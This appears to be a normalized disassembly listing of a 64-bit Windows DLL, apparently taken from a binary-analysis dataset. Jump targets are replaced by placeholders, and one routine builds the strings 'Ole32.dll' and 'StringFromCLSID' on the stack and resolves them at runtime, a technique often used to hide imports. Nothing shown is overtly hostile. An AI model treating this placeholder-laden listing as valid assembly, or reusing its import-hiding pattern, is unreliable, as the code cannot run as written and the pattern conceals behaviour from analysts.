mov edx 0x1
mov rcx rbx
call sub_180003cb0
mov rax [ rbx ]
mov rcx [ rax + rdi * 8 ]
mov [ rdx ] rcx
add [ rbx + 0x8 ] 0x8
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180011090
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x40
mov rdi rcx
xor r12d r12d
add rcx 0x198
mov esi r12d
call sub_18001c2b4
mov rcx [ rdi + 0xb0 ]
mov rax [ rdi + 0xb8 ]
mov ebx r12d
sub rax rcx
sar rax 0x3
test rax rax
je r-xdata
lea rcx [ rdi + 0x198 ]
call sub_18001c2bc
test rsi rsi
jne r-xdata
nop [ rax ] eax
mov rax rsi
cmp [ rdi + 0x70 ] r12
je r-xdata
movzx r8d al
mov rdx rbx
mov rcx rdi
call sub_180010180
mov rcx [ rdi + 0xb0 ]
xor edx edx
mov rcx [ rcx + rbx * 8 ]
mov rsi rax
call sub_180013380
mov rcx [ rdi + 0xb0 ]
mov rax [ rdi + 0xb8 ]
inc rbx
sub rax rcx
sar rax 0x3
cmp rbx rax
jb r-xdata
lea rdx [ rsp + 0x20 ]
lea rcx [ rdi + 0x50 ]
call sub_180010710
mov rdx rax
mov rax [ rax ]
test rax rax
jne r-xdata
mov rcx [ rcx + rbx * 8 ]
call sub_180013390
test al al
jne r-xdata
jmp r-xdata
mov rax [ rax ]
mov rax r12
jmp r-xdata
mov rax [ rax + 0x8 ]
mov r8 [ rdi + 0x70 ]
mov rcx [ rax + rcx * 8 ]
mov rax [ rcx + rdx * 8 ]
test r8 r8
je r-xdata
sub rcx r8
mov rdx [ rdx + 0x10 ]
mov r8 [ rax + 0x10 ]
mov rcx rdx
and edx 0x1
shr rcx 0x1
cmp r8 rcx
ja r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
inc [ rdi + 0x68 ]
mov rdx [ rdi + 0x68 ]
mov rcx [ rdi + 0x60 ]
add rcx rcx
cmp rcx rdx
lea rcx [ r8 - 0x1 ]
cmovbe rdx r12
mov [ rdi + 0x70 ] rcx
mov [ rdi + 0x68 ] rdx
test rcx rcx
jne r-xdata
mov [ rdi + 0x68 ] r12
jmp r-xdata
sub_1800111f0
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x78 ] rbx
mov rsi rcx
xor edi edi
mov [ rsp + 0x80 ] edi
mov rax [ rcx ]
mov r8d r8d
call [ rax + 0x68 ]
mov r14 rax
test rax rax
je r-xdata
mov eax edi
jmp r-xdata
lea ecx [ rdi + 0x28 ]
call sub_18001c84c
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x78 ]
add rsp 0x40
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov rbx rdi
mov rcx rax
call sub_1800132d0
mov rbx rax
jmp r-xdata
test rbx rbx
je r-xdata
mov rax [ r12 ]
mov rcx r12
call [ rax + 0x18 ]
movzx r13d ax
test ax ax
je r-xdata
mov [ rsp + 0x70 ] rbx
mov rdx r14
mov rcx rbx
call sub_180013320
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x78 ]
mov r12 rax
mov rax [ rax ]
mov rdx r14
mov rcx r12
call [ rax + 0x68 ]
test al al
je r-xdata
mov rax [ r12 ]
mov edx 0x1
mov rcx r12
call [ rax ]
mov r8 [ rsi ]
mov rdx r14
mov rcx rsi
call [ r8 + 0x70 ]
nop
mov rcx rbx
call sub_1800132f0
mov rcx rbx
call j_sub_18001c80c
movzx edx ax
mov rcx rsi
call sub_1800102e0
cmp eax 0xffffffff
setne al
test al al
jne r-xdata
mov rdx r12
mov rcx rbx
call sub_180013300
movzx edx r13w
mov rcx rbx
call sub_180013340
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] edi
mov r9 r12
lea r8 [ sub_180010150 ]
xor edx edx
xor ecx ecx
call sub_18001d9a8
test rax rax
je r-xdata
mov rdx rax
mov rcx rbx
call sub_180013360
mov dl 0x33
mov rcx rbx
call sub_180013380
mov dl 0x1
mov rcx rbx
call sub_1800133c0
lea rcx [ rsi + 0xb0 ]
lea rdx [ rsp + 0x70 ]
call sub_180010fd0
movzx edi r13w
mov [ rsp + 0x80 ] edi
test edi edi
jne r-xdata
mov rbx [ rsp + 0x70 ]
sub_180011380
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0xd0
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
mov r13d r8d
mov rsi rdx
mov r12 rcx
mov [ rsp + 0x30 ] rdx
mov ecx 0x28
call sub_18001c84c
xor r14d r14d
test rax rax
je r-xdata
mov rbx r14
mov rdx [ rsi ]
mov rcx rax
call sub_1800100a0
mov rbx rax
jmp r-xdata
mov rcx rbx
call j_sub_18001c80c
or rdi 0xffffffffffffffff
test rbp rbp
je r-xdata
call sub_18001c80c
mov [ rbx + 0xc ] r14d
mov rdx rbx
mov rcx [ r12 + 0x48 ]
call sub_18000b4e0
mov rbp rax
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rbx [ rsi + 0x8 ]
test rbx rbx
je r-xdata
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ rdi + 0xd ]
lea rdx [ rw-data ]
lea rcx [ rsp + 0x68 ]
call sub_180008860
nop
lea rdx [ rsp + 0x98 ]
lea rcx [ rsp + 0x68 ]
call sub_1800092e0
nop
mov [ rsp + 0x58 ] 0x7
mov [ rsp + 0x50 ] r14
mov [ rsp + 0x40 ] r14w
mov r9 rdi
xor r8d r8d
lea rdx [ rsp + 0x98 ]
lea rcx [ rsp + 0x40 ]
call sub_180001ac0
mov rcx [ r12 + 0x40 ]
mov rax [ rcx ]
mov r9d r13d
lea r8 [ rsp + 0x40 ]
mov rdx rbp
call [ rax + 0x20 ]
mov rcx [ rbp ]
test rcx rcx
je r-xdata
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18001d1f0
add rsp 0xd0
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
[ rbx + 0x8 ]
jne r-xdata
mov rcx rbp
call j_sub_18001c80c
nop
cmp [ rsp + 0xb0 ] 0x8
jb r-xdata
call sub_18001c80c
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov [ rsp + 0xb0 ] 0x7
mov [ rsp + 0xa8 ] r14
mov [ rsp + 0x98 ] r14w
lea rcx [ rsp + 0x68 ]
call sub_180008890
nop
mov rcx [ rsp + 0x98 ]
call j_sub_18001c80c
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180011540
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0xe0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
movzx r13d r9b
mov r14d r8d
mov rsi rcx
mov [ rsp + 0x48 ] 0x7
xor r15d r15d
mov [ rsp + 0x40 ] r15
mov [ rsp + 0x30 ] r15w
or r9 0xffffffffffffffff
xor r8d r8d
lea rcx [ rsp + 0x30 ]
call sub_180001ac0
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x58 ]
call sub_180009710
nop
mov rbp [ rsp + 0x68 ]
lea rcx [ rbp + 0x1 ]
lea edx [ r15 + 0x1 ]
call sub_18001d210
mov r12 rax
test rax rax
jne r-xdata
lea r8 [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x10
cmovae r8 [ rsp + 0x58 ]
mov r9 rbp
mov rdx rbp
mov rcx rax
call sub_18001d25c
mov ecx 0x28
call sub_18001c84c
mov rdi rax
mov [ rsp + 0x20 ] rax
test rax rax
je r-xdata
jmp r-xdata
mov rdi r15
movzx ebx [ rw-data ]
mov rdx [ rsi ]
mov rcx rsi
call [ rdx + 0x18 ]
mov [ rdi ] r15
mov [ rdi + 0x8 ] ax
mov [ rdi + 0xa ] bl
mov [ rdi + 0xc ] r14d
mov [ rdi + 0x10 ] r13b
mov [ rdi + 0x18 ] r12
mov [ rdi + 0x20 ] rbp
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp rbp 0x200000
cmova ecx eax
mov [ rdi + 0x11 ] cl
jmp r-xdata
cmp [ rsp + 0x70 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_18001d1f0
mov rbx [ rsp + 0xe0 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
mov [ rsp + 0x20 ] rdi
lea rcx [ rsi + 0x50 ]
lea rdx [ rsp + 0x20 ]
call sub_180010bc0
nop
sub_1800116b0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
or rcx 0xffffffffffffffff
mov rdi r8
mov r9 r8
mov r10 rdx
xor eax eax
[ rdi ]
xor esi esi
mov rdx r9
not rcx
mov [ rsp + 0x30 ] esi
lea r8 [ rcx - 0x1 ]
mov rcx r10
call sub_180010e70
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov rcx rbx
mov rdx rax
mov [ rbx ] si
call sub_180003f60
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
sub_180011720
mov [ rsp + 0x8 ] rcx
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x68 ] rbp
movzx ebp r8w
mov rsi rdx
mov rbx rcx
xor r12d r12d
mov [ rsp + 0x58 ] r12d
mov [ rcx + 0x18 ] 0x7
mov [ rcx + 0x10 ] r12
mov [ rcx ] r12w
mov [ rsp + 0x58 ] 0x1
mov rdx [ rdx + 0x10 ]
inc rdx
mov rdi [ rcx + 0x10 ]
cmp rdi rdx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_18000c2e0
movzx r8d bp
mov edx 0x1
mov rcx rbx
call sub_180010d40
mov rax rbx
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
cmp [ rcx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
call sub_180001880
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi * 2 ] r12w
sub_1800117e0
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov [ rsp + 0x78 ] rsi
mov rdi rcx
xor edx edx
mov ecx [ rw-data ]
call [ SleepEx@IAT ]
cmp [ rdi + 0xa0 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
lea rdx [ rsp + 0x48 ]
lea rcx [ rdi + 0x80 ]
call sub_180010710
mov rcx rax
mov rax [ rax ]
xor r9d r9d
test rax rax
jne r-xdata
mov rax [ rax ]
mov eax r9d
jmp r-xdata
mov rax [ rax + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov [ rsp + 0x28 ] r9
mov rbx r9
mov [ rsp + 0x30 ] rbx
mov rdx [ rcx + 0x8 ]
mov r8 [ rcx ]
test rdx rdx
je r-xdata
sub rcx rdx
mov rcx [ rcx + 0x10 ]
mov rdx [ rax + 0x10 ]
cmp rdx rcx
ja r-xdata
mov [ rsp + 0x38 ] r9
mov [ rsp + 0x40 ] r9
test rbx rbx
je r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
mov rax [ rdi ]
lea rdx [ rsp + 0x38 ]
mov rcx rdi
call [ rax + 0x8 ]
lea rcx [ rdi + 0x80 ]
call sub_180005540
nop
test rbx rbx
je r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
nop [ rax + rax ] ax
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
nop [ rax ] eax
mov rbx rdx
mov [ rsp + 0x30 ] rdx
mov [ rsp + 0x28 ] r8
jmp r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov r8 rbx
mov rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x38 ]
call sub_1800011a0
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
jmp r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_180011950
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xd0
mov [ rbp - 0x59 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov ebx edx
mov [ rbp - 0x69 ] edx
mov rsi rcx
mov ecx 0x30
call sub_18001c84c
mov [ rbp - 0x61 ] rax
xor r13d r13d
test rax rax
je r-xdata
mov r15 r13
mov rcx rax
call sub_180008850
mov r15 rax
jmp r-xdata
mov r8d 0x10
lea rdx [ rw-data ]
call sub_1800088c0
mov [ rbp - 0x39 ] r12
mov rdi r13
mov [ rbp - 0x41 ] r13
mov [ rbp - 0x51 ] r13w
mov rax [ rsi + 0xb8 ]
sub rax [ rsi + 0xb0 ]
sar rax 0x3
or r14 0xffffffffffffffff
test rax rax
je r-xdata
lea r8d [ r12 + 0x2b ]
lea rdx [ rw-data ]
call sub_1800088c0
lea rdx [ rbp - 0x51 ]
mov rcx r15
call sub_1800092e0
mov rdi rax
lea rax [ rbp - 0x29 ]
cmp rax rdi
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx r15
call sub_1800088d0
mov r12d 0x7
mov [ rbp - 0x11 ] r12
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
mov rax [ rsi + 0xb8 ]
sub rax [ rsi + 0xb0 ]
mov rcx r15
test rax 0xfffffffffffffff8
jne r-xdata
mov r8 [ rbp - 0x19 ]
lea r9 [ r8 - 0x1 ]
cmp r8 r9
jae r-xdata
cmp rdi 0x104
jb r-xdata
cmp [ rbp - 0x39 ] 0x8
jmp r-xdata
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rax r8
sub rax r9
cmp rax 0xffffffffffffffff
jae r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
xor r8d r8d
mov edx 0x104
sub rdx rdi
lea rcx [ rbp - 0x51 ]
call sub_180010d40
mov rbx r14
lea rax [ rdi - 0x104 ]
cmp rax 0xffffffffffffffff
jae r-xdata
jb r-xdata
mov [ rbp - 0x11 ] r12
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
lea rdx [ rbp - 0x29 ]
mov rcx [ rbp - 0x29 ]
mov rax [ rbp - 0x11 ]
cmp rax 0x8
cmovae rdx rcx
lea rdi [ rbp - 0x29 ]
cmovae rdi rcx
sub r8 r14
sub r8 r9
add r8 r8
lea rax [ r14 + r9 ]
lea rdx [ rdx + rax * 2 ]
lea rcx [ rdi + r9 * 2 ]
call sub_18001c4a0
mov rdx [ rbp - 0x19 ]
sub rdx r14
mov [ rbp - 0x19 ] rdx
lea rax [ rbp - 0x29 ]
cmp [ rbp - 0x11 ] 0x8
cmovae rax [ rbp - 0x29 ]
xor ecx ecx
mov [ rax + rdx * 2 ] cx
mov r12 [ rbp - 0x39 ]
mov r14 rax
test rax rax
je r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rbx [ rsi + 0x170 ]
lea rdx [ rbp - 0x51 ]
mov rax [ rbp - 0x51 ]
cmp r12 0x8
cmovae rdx rax
lea rcx [ rbp - 0x51 ]
cmovae rcx rax
sub rdi rbx
lea r8 [ rdi + rdi - 0x208 ]
lea rdx [ rdx + rbx * 2 + 0x208 ]
add rcx 0x208
call sub_18001c4a0
mov rdx [ rbp - 0x41 ]
sub rdx rbx
mov [ rbp - 0x41 ] rdx
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x8
cmovae rax [ rbp - 0x51 ]
xor ecx ecx
mov [ rax + rdx * 2 ] cx
jmp r-xdata
mov rbx rax
test rax rax
je r-xdata
mov r9b 0x1
mov r8d ebx
lea rdx [ rbp - 0x29 ]
mov rcx rsi
call sub_180011540
test r15 r15
je r-xdata
mov rcx [ rbp - 0x51 ]
call j_sub_18001c80c
mov rax [ rdi ]
mov [ rbp - 0x29 ] rax
mov [ rdi ] r13
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rbp - 0x29 ]
call sub_18001c4a0
jmp r-xdata
cmp r12 0x8
lea rdx [ rbp - 0x1 ]
mov rcx r15
call sub_1800092e0
mov r12 rax
mov rcx [ rsi + 0xb0 ]
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rbx [ rbx ]
mov rcx [ rsi + 0xb0 ]
mov rcx [ rcx + r13 * 8 ]
call sub_1800133d0
test al al
lea rbx [ rsi + 0x148 ]
jne r-xdata
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rcx r15
call sub_180008890
mov rcx r15
call j_sub_18001c80c
nop
mov rax [ rdi + 0x10 ]
mov [ rbp - 0x19 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp - 0x11 ] rax
mov [ rdi + 0x18 ] r12
mov [ rdi + 0x10 ] r13
mov [ rdi ] r13w
lea rdi [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x8
cmovae rdi [ rbp - 0x51 ]
mov rcx [ rcx + r13 * 8 ]
call sub_180013350
movzx r9d ax
mov [ rsp + 0x20 ] rbx
mov r8 r12
mov edx 0x104
mov rcx rdi
call sub_18001d620
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov r12 [ rax ]
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0xd0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x29 ]
call j_sub_18001c80c
lea rdi [ rbp - 0x51 ]
mov r8 [ rbp - 0x51 ]
mov r10 [ rbp - 0x39 ]
cmp r10 0x8
cmovae rdi r8
xor eax eax
mov rcx r14
[ rdi ]
not rcx
dec rcx
mov rdi rcx
mov r9 [ rbp - 0x41 ]
cmp r9 rcx
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
xor r8d r8d
sub rdi r9
mov rdx rdi
lea rcx [ rbp - 0x51 ]
call sub_180010d40
mov rbx r14
mov rax r9
sub rax rcx
cmp rax 0xffffffffffffffff
jae r-xdata
inc r13
mov rax [ rsi + 0xb8 ]
sub rax [ rsi + 0xb0 ]
sar rax 0x3
mov r12 [ rbp - 0x39 ]
cmp r13 rax
jae r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18001c80c
lea rdx [ rbp - 0x51 ]
cmp r10 0x8
cmovae rdx r8
lea rcx [ rbp - 0x51 ]
cmovae rcx r8
sub r9 rbx
sub r9 rdi
lea r8 [ r9 + r9 ]
lea rax [ rbx + rdi ]
lea rdx [ rdx + rax * 2 ]
lea rcx [ rcx + rdi * 2 ]
call sub_18001c4a0
mov rdx [ rbp - 0x41 ]
sub rdx rbx
mov [ rbp - 0x41 ] rdx
lea rax [ rbp - 0x51 ]
cmp [ rbp - 0x39 ] 0x8
cmovae rax [ rbp - 0x51 ]
xor ecx ecx
mov [ rax + rdx * 2 ] cx
jmp r-xdata
mov rbx rax
test rax rax
je r-xdata
mov ebx [ rbp - 0x69 ]
mov rdi [ rbp - 0x41 ]
jmp r-xdata
mov r8d 0xa
lea rdx [ rbp - 0x51 ]
lea rcx [ rbp - 0x1 ]
call sub_180011720
nop
mov r9 r14
xor r8d r8d
mov rdx rax
lea rcx [ rbp - 0x29 ]
call sub_18000c2e0
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
sub_180011df0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x40
mov rax [ rcx + 0x20 ]
mov rsi rdx
mov rbx rcx
inc rax
cmp [ rcx + 0x10 ] rax
ja r-xdata
mov rdi [ rbx + 0x18 ]
mov rax [ rbx + 0x10 ]
add rdi [ rbx + 0x20 ]
cmp rax rdi
ja r-xdata
mov edx 0x1
call sub_1800053b0
mov rax [ rbx + 0x8 ]
cmp [ rax + rdi * 8 ] 0x0
jne r-xdata
sub rdi rax
mov rax [ rbx + 0x8 ]
mov rdx [ rax + rdi * 8 ]
test rdx rdx
je r-xdata
mov ecx 0x10
call sub_18001c84c
test rax rax
je r-xdata
inc [ rbx + 0x20 ]
mov rsi [ rsp + 0x60 ]
mov rbx [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
xor eax eax
mov [ rdx ] rax
mov [ rdx + 0x8 ] rax
cmp rdx rsi
je r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] rax
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_18001c8f0
int3
mov rcx [ rbx + 0x8 ]
mov [ rcx + rdi * 8 ] rax
mov ecx eax
mov rax [ rsi + 0x8 ]
mov [ rdx + 0x8 ] rax
mov [ rsi + 0x8 ] rcx
mov rax [ rsi ]
mov rcx [ rdx ]
mov [ rdx ] rax
mov [ rsi ] rcx
sub_180011ed0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x1a8 ]
sub rsp 0x280
mov [ rsp + 0x58 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x170 ] rax
mov rdi rcx
mov [ rsp + 0x50 ] rcx
lea rax [ r--data ]
mov [ rcx ] rax
add rcx 0x10
lea rdx [ rsp + 0x20 ]
call sub_180001960
xor ebx ebx
mov [ rdi + 0x8 ] ebx
lea rax [ r--data ]
mov [ rdi ] rax
lea rcx [ rdi + 0x50 ]
lea rdx [ rsp + 0x20 ]
call sub_180001960
nop
lea rcx [ rdi + 0x80 ]
lea rdx [ rsp + 0x20 ]
call sub_180001960
nop
mov [ rdi + 0xb0 ] rbx
mov [ rdi + 0xb8 ] rbx
mov [ rdi + 0xc0 ] rbx
mov [ rdi + 0xe8 ] 0x7
mov [ rdi + 0xe0 ] rbx
mov [ rdi + 0xd0 ] bx
mov [ rdi + 0x110 ] 0x7
mov [ rdi + 0x108 ] rbx
mov [ rdi + 0xf8 ] bx
mov [ rdi + 0x138 ] 0x7
mov [ rdi + 0x130 ] rbx
mov [ rdi + 0x120 ] bx
mov [ rdi + 0x160 ] 0x7
mov [ rdi + 0x158 ] rbx
mov [ rdi + 0x148 ] bx
mov [ rdi + 0x188 ] 0x7
mov [ rdi + 0x180 ] rbx
mov [ rdi + 0x170 ] bx
lea rcx [ rdi + 0x198 ]
call sub_18001c26c
nop
lea ecx [ rbx + 0x30 ]
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x10
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_1800092e0
nop
mov rdx rax
lea rcx [ rdi + 0xf8 ]
call sub_180003f60
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx rax
call sub_180008850
mov rbx rax
mov r8d 0x14
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_1800092e0
nop
mov rdx rax
lea rcx [ rdi + 0x120 ]
call sub_180003f60
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_1800092e0
nop
mov rdx rax
lea rcx [ rdi + 0x148 ]
call sub_180003f60
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov r8d 0x1e
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_1800092e0
nop
mov rdx rax
lea rcx [ rdi + 0x170 ]
call sub_180003f60
nop
cmp [ rsp + 0x78 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov r8d 0x36
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
mov rcx rbx
call j_sub_1800088e0
mov rsi rax
mov r8d 0xc
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
mov rcx rbx
call j_sub_1800088e0
mov r12 rax
mov r8d 0xc3
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
mov [ rbp + 0xa0 ] 0x0
xor edx edx
mov r8d 0xc2
lea rcx [ rbp + 0xa1 ]
call sub_18001c9f0
lea rdx [ rsp + 0x60 ]
mov rcx rbx
call sub_180009450
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
lea rcx [ rbp + 0xa0 ]
mov rdx rax
mov r8d 0xc3
call sub_18001c4a0
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rax [ rax ]
test rbx rbx
je r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18001c80c
mov ecx 0x20
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
xor ebx ebx
mov eax ebx
mov r8d 0xc3
lea rdx [ rbp + 0xa0 ]
mov rcx rax
call sub_18000b560
xor ebx ebx
jmp r-xdata
mov [ rbp + 0x88 ] 0x69727453
mov [ rbp + 0x8c ] 0x7246676e
mov [ rbp + 0x90 ] 0x4c436d6f
mov [ rbp + 0x94 ] 0x444953
test rax rax
je r-xdata
lea rcx [ rbp + 0x78 ]
call [ LoadLibraryA@IAT ]
mov [ rdi + 0x48 ] rax
mov [ rsp + 0x28 ] rbx
mov [ rbp + 0x78 ] 0x33656c4f
mov [ rbp + 0x7c ] 0x6c642e32
mov [ rbp + 0x80 ] 0x6c
lea rcx [ rbp + 0x78 ]
call [ GetModuleHandleA@IAT ]
test rax rax
jne r-xdata
mov ecx 0xe8
call sub_18001c84c
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
lea rdx [ rbp + 0x88 ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rax rbx
movups xmm0 [ rw-data ]
movaps [ rsp + 0x40 ] xmm0
lea r9 [ rsp + 0x40 ]
mov r8 rsi
xor edx edx
mov rcx rax
call sub_18000e4f0
jmp r-xdata
lea rdx [ rsp + 0x28 ]
lea rcx [ rw-data ]
call rax
mov [ rbp + 0x18 ] 0x7
mov [ rbp + 0x10 ] rbx
mov [ rbp ] bx
cmp [ rbp - 0x60 ] 0x8
jb r-xdata
mov rcx [ rbp ]
call j_sub_18001c80c
mov [ rdi + 0x40 ] rax
lea rdx [ rbp + 0x50 ]
mov rcx rax
call sub_18000ccb0
nop
lea r8 [ r--data ]
mov rdx rax
lea rcx [ rsp + 0x60 ]
call sub_1800116b0
nop
mov r8 rsi
mov rdx rax
lea rcx [ rbp - 0x28 ]
call sub_1800116b0
nop
lea r8 [ r--data ]
mov rdx rax
lea rcx [ rbp - 0x50 ]
call sub_1800116b0
nop
mov r8 [ rsp + 0x28 ]
mov rdx rax
lea rcx [ rbp + 0x28 ]
call sub_1800116b0
nop
lea r8 [ r--data ]
mov rdx rax
lea rcx [ rbp - 0x78 ]
call sub_1800116b0
nop
mov r8 r12
mov rdx rax
lea rcx [ rbp ]
call sub_1800116b0
nop
mov rdx rax
lea rcx [ rdi + 0xd0 ]
call sub_180003f60
nop
cmp [ rbp + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x60 ] 0x7
mov [ rbp - 0x68 ] rbx
mov [ rbp - 0x78 ] bx
cmp [ rbp + 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x78 ]
